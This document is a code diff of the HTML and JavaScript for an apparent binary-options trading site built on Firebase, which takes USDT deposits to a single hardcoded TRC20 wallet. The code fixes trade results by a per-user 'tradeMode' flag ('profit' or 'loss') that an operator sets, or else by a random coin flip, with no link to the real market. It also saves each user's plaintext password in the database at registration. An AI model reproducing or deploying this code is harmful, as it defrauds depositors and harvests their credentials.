@@ -23,8 +23,7 @@
         #loadingScreen { position: fixed; inset: 0; background: #05070a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .loader-spin { width: 35px; height: 35px; border: 3px solid #1a1f29; border-top: 3px solid #eab308; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        select option { background: #1a1f29; color: white; }
-
+        
         .success-checkmark { width: 60px; height: 60px; margin: 0 auto; border: 3px solid #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .error-xmark { width: 60px; height: 60px; margin: 0 auto; border: 3px solid #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
     </style>
@@ -63,26 +62,10 @@
 
         <div class="mb-2">
             <select id="assetSelect" onchange="loadChart(this.value)" class="w-full bg-white/5 border border-white/10 rounded-xl p-2 text-yellow-500 font-bold text-[11px] outline-none">
-                <optgroup label="CRYPTO">
-                    <option value="BINANCE:BTCUSDT">BTC/USDT</option><option value="BINANCE:ETHUSDT">ETH/USDT</option>
-                    <option value="BINANCE:SOLUSDT">SOL/USDT</option><option value="BINANCE:BNBUSDT">BNB/USDT</option>
-                    <option value="BINANCE:XRPUSDT">XRP/USDT</option><option value="BINANCE:ADAUSDT">ADA/USDT</option>
-                    <option value="BINANCE:DOGEUSDT">DOGE/USDT</option><option value="BINANCE:MATICUSDT">MATIC/USDT</option>
-                    <option value="BINANCE:LTCUSDT">LTC/USDT</option><option value="BINANCE:SHIBUSDT">SHIB/USDT</option>
-                </optgroup>
-                <optgroup label="FOREX">
-                    <option value="FX:EURUSD">EUR/USD</option><option value="FX:GBPUSD">GBP/USD</option>
-                    <option value="FX:USDJPY">USD/JPY</option><option value="FX:AUDUSD">AUD/USD</option>
-                    <option value="FX:USDCAD">USD/CAD</option><option value="FX:USDCHF">USD/CHF</option>
-                    <option value="FX:NZDUSD">NZD/USD</option><option value="FX:EURJPY">EUR/JPY</option>
-                    <option value="FX:GBPJPY">GBP/JPY</option><option value="FX:EURAUD">EUR/AUD</option>
-                </optgroup>
-                <optgroup label="STOCKS & METALS">
-                    <option value="OANDA:XAUUSD">GOLD (XAU/USD)</option><option value="OANDA:XAGUSD">SILVER</option>
-                    <option value="NASDAQ:AAPL">APPLE</option><option value="NASDAQ:TSLA">TESLA</option>
-                    <option value="NASDAQ:NVDA">NVIDIA</option><option value="NASDAQ:MSFT">MICROSOFT</option>
-                    <option value="NASDAQ:AMZN">AMAZON</option><option value="NASDAQ:NFLX">NETFLIX</option>
-                </optgroup>
+                <option value="BINANCE:BTCUSDT">BTC/USDT</option>
+                <option value="BINANCE:ETHUSDT">ETH/USDT</option>
+                <option value="FX:EURUSD">EUR/USD</option>
+                <option value="OANDA:XAUUSD">GOLD</option>
             </select>
         </div>
 
@@ -101,13 +84,13 @@
                     <span class="text-[8px] text-gray-500 font-bold uppercase block ml-1">Time</span>
                     <select id="duration" class="bg-transparent font-black text-white text-base w-full outline-none">
                         <option value="5">5s</option><option value="15">15s</option><option value="30">30s</option>
-                        <option value="60">1m</option><option value="120">2m</option><option value="300">5m</option>
+                        <option value="60">1m</option>
                     </select>
                 </div>
             </div>
             <div class="grid grid-cols-2 gap-3">
-                <button onclick="initTrade('UP')" class="btn-grad-green h-12 rounded-xl font-black text-white uppercase text-sm shadow-lg shadow-green-900/20">Call</button>
-                <button onclick="initTrade('DOWN')" class="btn-grad-red h-12 rounded-xl font-black text-white uppercase text-sm shadow-lg shadow-red-900/20">Put</button>
+                <button onclick="initTrade('UP')" class="btn-grad-green h-12 rounded-xl font-black text-white uppercase text-sm">Call</button>
+                <button onclick="initTrade('DOWN')" class="btn-grad-red h-12 rounded-xl font-black text-white uppercase text-sm">Put</button>
             </div>
         </footer>
     </div>
@@ -115,25 +98,19 @@
     <div id="depM" class="modal">
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <div id="dStep1">
-                <h2 class="text-xl font-black text-yellow-500 mb-6 uppercase">Deposit Amount</h2>
+                <h2 class="text-xl font-black text-yellow-500 mb-6 uppercase">Deposit</h2>
                 <input type="number" id="depAmtInput" placeholder="Enter Amount ($)" class="auth-input mb-6 text-center text-lg">
                 <button onclick="toDStep(2)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
             </div>
-            <div id="dStep2" class="hidden">
-                <h2 class="text-sm font-bold text-yellow-500 mb-4 uppercase">Scan & Pay (TRC20)</h2>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="mx-auto mb-4 rounded-xl p-2 bg-white">
-                <div class="bg-black/40 p-3 rounded-xl mb-4 flex justify-between items-center border border-white/10">
-                    <span class="text-[9px] text-white truncate mr-2" id="walletAddr">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</span>
-                    <button id="copyBtn" onclick="copyWallet()" class="text-yellow-500 text-[9px] font-bold">COPY</button>
-                </div>
+            <div id="dStep2" class="hidden text-center">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="mx-auto mb-4 p-2 bg-white rounded-xl">
+                <p class="text-[10px] text-gray-400 mb-2">USDT (TRC20)</p>
+                <button id="copyBtn" onclick="copyWallet()" class="bg-white/10 px-4 py-2 rounded-lg text-yellow-500 text-xs font-bold mb-4">COPY ADDRESS</button>
                 <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">I Have Paid</button>
             </div>
-            <div id="dStep3" class="hidden space-y-3 text-left">
-                <h2 class="text-sm font-bold text-yellow-500 mb-4 uppercase text-center">Submit Proof</h2>
-                <input type="email" id="depEmail" placeholder="Enter Your Email" class="auth-input">
-                <input type="text" id="depTg" placeholder="Enter Telegram ID" class="auth-input">
+            <div id="dStep3" class="hidden space-y-3">
                 <input type="text" id="depTx" placeholder="Enter TXID" class="auth-input">
-                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit Now</button>
+                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit Proof</button>
             </div>
             <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Cancel</button>
         </div>
@@ -142,31 +119,19 @@
     <div id="witM" class="modal">
         <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
             <h2 class="text-xl font-black text-yellow-500 mb-6 uppercase">Withdraw</h2>
-            <select id="witNet" class="auth-input mb-4 text-sm">
-                <option value="TRC20">USDT (TRC20)</option>
-                <option value="BEP20">USDT (BEP20)</option>
-            </select>
-            <input type="text" id="witAddr" placeholder="Enter Wallet Address" class="auth-input mb-4">
-            <input type="number" id="witAmt" placeholder="Withdraw Amount ($)" class="auth-input mb-6">
+            <input type="text" id="witAddr" placeholder="Wallet Address" class="auth-input mb-4">
+            <input type="number" id="witAmt" placeholder="Amount ($)" class="auth-input mb-6">
             <button onclick="submitWit()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase">Submit Request</button>
-            <button onclick="hideM('witM')" class="w-full mt-4 text-gray-500 text-[10px] font-bold uppercase text-center">Cancel</button>
+            <button onclick="hideM('witM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Cancel</button>
         </div>
     </div>
 
     <div id="settingsM" class="modal">
-        <div class="glass-card p-6 rounded-[32px] w-full max-w-sm">
-            <div class="flex justify-between items-center mb-6">
-                <h2 class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Account Profile</h2>
-                <button onclick="hideM('settingsM')" class="text-gray-500 text-2xl">&times;</button>
-            </div>
-            <div class="text-center mb-6">
-                <div class="relative inline-block">
-                    <div class="w-20 h-20 bg-gradient-to-tr from-yellow-500 to-yellow-200 rounded-full flex items-center justify-center mx-auto text-3xl font-black text-black" id="profileCircle">?</div>
-                </div>
-                <h2 id="sEmailDisp" class="text-sm font-bold text-white mt-4 break-all">User</h2>
-                <span class="text-[9px] bg-green-500/10 text-green-500 px-3 py-1 rounded-full font-bold uppercase">Verified Trader</span>
-            </div>
-            <button onclick="auth.signOut();" class="w-full py-4 bg-red-600/10 text-red-500 border border-red-600/20 font-black rounded-2xl uppercase text-[10px]">Secure Logout</button>
+        <div class="glass-card p-6 rounded-[32px] w-full max-w-sm text-center">
+            <div class="w-20 h-20 bg-yellow-500 rounded-full flex items-center justify-center mx-auto text-3xl font-black text-black mb-4" id="profileCircle">?</div>
+            <h2 id="sEmailDisp" class="text-white font-bold mb-6">User</h2>
+            <button onclick="auth.signOut().then(()=>location.reload())" class="w-full py-4 bg-red-600/10 text-red-500 border border-red-600/20 font-black rounded-2xl uppercase text-[10px]">Secure Logout</button>
+            <button onclick="hideM('settingsM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Close</button>
         </div>
     </div>
 
@@ -184,13 +149,12 @@
         function showM(id) { document.getElementById(id).style.display = 'flex'; }
         function hideM(id) { document.getElementById(id).style.display = 'none'; if(id==='depM') toDStep(1); }
 
-        // FANCY UI NOTIFICATIONS
         function showSuccess(title, msg) {
             const box = document.getElementById('resultBox');
             box.innerHTML = `
                 <div class="mb-4"><div class="success-checkmark"><span class="text-green-500 text-3xl">✓</span></div></div>
                 <h2 class="text-green-500 font-black text-xl mb-2 uppercase">${title}</h2>
-                <p class="text-gray-400 text-[10px] font-bold uppercase tracking-wider mb-6">${msg}</p>
+                <p class="text-gray-400 text-[10px] font-bold uppercase mb-6">${msg}</p>
                 <button onclick="hideM('resultM')" class="w-full bg-white/5 border border-white/10 py-3 rounded-xl uppercase font-black text-xs">Dismiss</button>
             `;
             showM('resultM');
@@ -200,8 +164,8 @@
             const box = document.getElementById('resultBox');
             box.innerHTML = `
                 <div class="mb-4"><div class="error-xmark"><span class="text-red-500 text-3xl">!</span></div></div>
-                <h2 class="text-red-500 font-black text-xl mb-2 uppercase">Failed</h2>
-                <p class="text-gray-400 text-[10px] font-bold uppercase tracking-wider mb-6">${msg}</p>
+                <h2 class="text-red-500 font-black text-xl mb-2 uppercase">Alert</h2>
+                <p class="text-gray-400 text-[10px] font-bold uppercase mb-6">${msg}</p>
                 <button onclick="hideM('resultM')" class="w-full bg-white/5 border border-white/10 py-3 rounded-xl uppercase font-black text-xs">Close</button>
             `;
             showM('resultM');
@@ -209,11 +173,11 @@
 
         function copyWallet() {
             navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM');
-            const btn = document.getElementById('copyBtn');
-            btn.innerText = "COPIED!";
-            setTimeout(() => btn.innerText = "COPY", 2000);
+            document.getElementById('copyBtn').innerText = "COPIED!";
+            setTimeout(() => document.getElementById('copyBtn').innerText = "COPY ADDRESS", 2000);
         }
 
+        // --- AUTH CHECKER FIX ---
         auth.onAuthStateChanged(user => {
             const loader = document.getElementById('loadingScreen');
             if(user) {
@@ -228,26 +192,29 @@
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
                         if(!chartLoaded) { loadChart('BINANCE:BTCUSDT'); chartLoaded = true; }
+                        loader.style.display = 'none'; // Hide loader after data is fetched
                     }
-                    loader.style.display = 'none';
                 });
             } else { 
                 document.getElementById('authSection').style.display = 'flex'; 
                 document.getElementById('appTerminal').style.display = 'none'; 
-                loader.style.display = 'none';
+                loader.style.display = 'none'; // Hide loader if no user found
             }
         });
 
         async function handleAuth() {
             const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
-            if(!e || !p) return showError("Please fill all authentication fields.");
+            if(!e || !p) return showError("Fill all fields");
             document.getElementById('loadingScreen').style.display = 'flex';
             try {
                 if(mode==='reg') {
                     const r = await auth.createUserWithEmailAndPassword(e, p);
                     await db.collection('users').doc(r.user.uid).set({ email: e, password: p, balance: 0, status: 'active', tradeMode: 'normal' });
                 } else { await auth.signInWithEmailAndPassword(e, p); }
-            } catch(err) { showError(err.message); document.getElementById('loadingScreen').style.display = 'none'; }
+            } catch(err) { 
+                document.getElementById('loadingScreen').style.display = 'none';
+                showError(err.message); 
+            }
         }
 
         function loadChart(s) { new TradingView.widget({ "autosize": true, "symbol": s, "interval": "1", "theme": "dark", "container_id": "tv_chart", "hide_top_toolbar": true, "hide_side_toolbar": true }); }
@@ -255,28 +222,55 @@
 
         async function submitFinalDep() {
             const tx = document.getElementById('depTx').value;
-            if(!tx) return showError("Transaction ID is required for verification.");
+            if(!tx) return showError("Enter TXID");
             await db.collection('requests').add({ uid: auth.currentUser.uid, txid: tx, amount: document.getElementById('depAmtInput').value, time: Date.now() });
             hideM('depM');
-            showSuccess("Deposit Received", "We are verifying your transaction. It usually takes 5-15 minutes.");
+            showSuccess("Request Sent", "Deposit is under verification (5-10m).");
         }
 
         async function submitWit() {
             const amt = parseFloat(document.getElementById('witAmt').value);
-            if(!amt || amt <= 0) return showError("Enter a valid amount to withdraw.");
-            if(amt > userData.balance) return showError("Insufficient Balance for withdrawal.");
+            if(!amt || amt > userData.balance) return showError("Invalid amount or low balance");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
             await db.collection('withdrawals').add({ uid: auth.currentUser.uid, amount: amt, address: document.getElementById('witAddr').value, time: Date.now() });
             hideM('witM');
-            showSuccess("Withdrawal Requested", "Your request is in queue. You will receive funds shortly.");
+            showSuccess("Success", "Withdrawal request placed.");
         }
 
         async function initTrade(type) {
             const amt = parseFloat(document.getElementById('tradeAmt').value), dur = parseInt(document.getElementById('duration').value);
-            if(amt > userData.balance || amt <= 0) return showError("Your balance is too low for this trade.");
+            if(amt > userData.balance || amt <= 0) return showError("Low Balance");
             await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
             document.getElementById('tradeTimer').style.display = 'block';
             let l = dur;
             let iv = setInterval(() => {
                 let m = Math.floor(l/60), s = l%60;
-                document.getElementById('timer
+                document.getElementById('timerText').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+                if(l <= 0) { clearInterval(iv); document.getElementById('tradeTimer').style.display = 'none'; showRes(amt); }
+                l--;
+            }, 1000);
+        }
+
+        async function showRes(amt) {
+            const m = userData.tradeMode || 'normal';
+            let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
+            const p = amt * 1.82, box = document.getElementById('resultBox');
+            if(win) {
+                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) });
+                box.innerHTML = `<h2 class="text-green-500 font-black text-xl">PROFIT</h2><h1 class="text-4xl text-white">+$${p.toFixed(2)}</h1>`;
+            } else {
+                box.innerHTML = `<h2 class="text-red-500 font-black text-xl">LOSS</h2><h1 class="text-4xl text-white">-$${amt.toFixed(2)}</h1>`;
+            }
+            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold text-sm">Continue</button>`;
+            showM('resultM');
+        }
+
+        function switchAuth(t) {
+            mode = t;
+            document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
+            document.getElementById('regTab').className = t==='reg' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold';
+            document.getElementById('authBtn').innerText = t==='login' ? 'Login' : 'Registration';
+        }
+    </script>
+</body>
+</html>
